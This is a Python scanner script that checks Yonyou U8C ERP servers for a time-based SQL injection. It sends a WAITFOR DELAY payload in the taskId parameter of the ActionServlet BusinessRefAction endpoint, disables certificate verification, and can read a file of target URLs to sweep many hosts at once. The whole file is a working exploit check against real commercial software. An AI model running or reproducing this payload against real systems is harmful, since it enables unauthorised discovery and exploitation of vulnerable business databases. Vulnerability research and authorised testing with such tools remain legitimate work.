import requests
import urllib3
from urllib.parse import urljoin,quote
import argparse
import ssl
import re
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1');WAITFOR DELAY '0:0:5'--")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    try:
        response = requests.get(target, verify=False, headers=headers, timeout=25)
        if response.status_code == 200 and '当前任务报表' in response.text and 5 < response.elapsed.total_seconds() < 10:
            print(f"\033[31mDiscovered:{url}: YongYouU8C_ActionServlet_SQLInject!\033[0m")
            return True
    except Exception as e:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")